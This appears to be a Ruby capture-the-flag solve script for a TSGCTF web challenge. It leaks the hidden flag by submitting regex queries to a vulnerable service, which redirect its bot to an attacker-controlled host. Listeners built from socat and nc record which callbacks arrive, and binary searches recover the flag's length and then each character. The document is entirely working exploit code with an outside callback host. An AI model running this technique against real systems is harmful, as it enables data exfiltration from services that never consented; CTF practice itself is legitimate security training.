require 'securerandom'
require 'socket'
require 'net/http'

Thread.new do
  # thread for 1st socket listen
  # add delay before SSL handshake
  `socat tcp-listen:8001,bind=0.0.0.0,fork,reuseaddr system:'sleep 2; nc 127.0.0.1 5678'`
end

Thread.new do
  # thread for SSL termination
  # present only the leaf certificate
  `socat openssl-listen:5678,fork,reuseaddr,certificate=cert.pem,key=privkey.pem,verify=0 system:'nc 127.0.0.1 6789'`
end

dict = {}

Thread.new do 
  # thread for HTTP communication
  # record request path into `dict`
  gs = TCPServer.new('127.0.0.1', 6789)
  loop do
    s = gs.accept
    Thread.new(s) do |s|
      key = s.gets.split[1][1,100]
      puts '[+] %s' % key
      s.puts 'HTTP/1.1 404 Not Found'
      s.puts
      s.close
      dict[key] = true
    end
  end
end


VULN = ARGV.shift || 'http://192.168.1.100:18364/'
ATTACK = ARGV.shift || 'https://jfwioaw.hopto.org:8001/'

def query(key, re)
  puts '[-] %s => %s' % [key, re]
  u = URI(VULN) + ('?' + re + '#' + ATTACK + key)
  res = Net::HTTP.post_form(URI(VULN) + "/query", {url: u})
end

CHARS = [*?A..?Z,*?0..?9,?_]

begin
  # leak FLAG length by binary search
  # detect whether any note matches TSGCTF{...<n times>...*}
  len = (0..100).bsearch { |n|
    puts n
    key = SecureRandom.hex
    q = 'TSGCTF{%s.*}' % [?.*n]
    query key, q
    sleep 5
    !dict[key]
  } - 1

  raise 'wtf!?' unless len == 16
end

ans = ?? * len

# leak FLAG by one chars
len.times do |i|
  cidx = (0..CHARS.size).bsearch { |x|
    q = ?. * len
    q[i] = "[%s]" % CHARS[0,x].join
    q = 'TSGCTF{%s}' % q

    r = ?. * len
    r[i] = "[%s]" % CHARS[x,100].join
    r = 'TSGCTF{%s}' % r

    kq, kr = nil, nil
    loop do
      kq = SecureRandom.hex
      query kq, q
      kr = SecureRandom.hex
      query kr, r
      30.times do
        sleep 1
        break if dict[kq] || dict[kr]
      end
      break if dict[kq] || dict[kr]
      puts '[.] retry'
    end
    dict[kq]
  } - 1
  ans[i] = CHARS[cidx]
  puts '[!] %s' % ans
end

puts ans
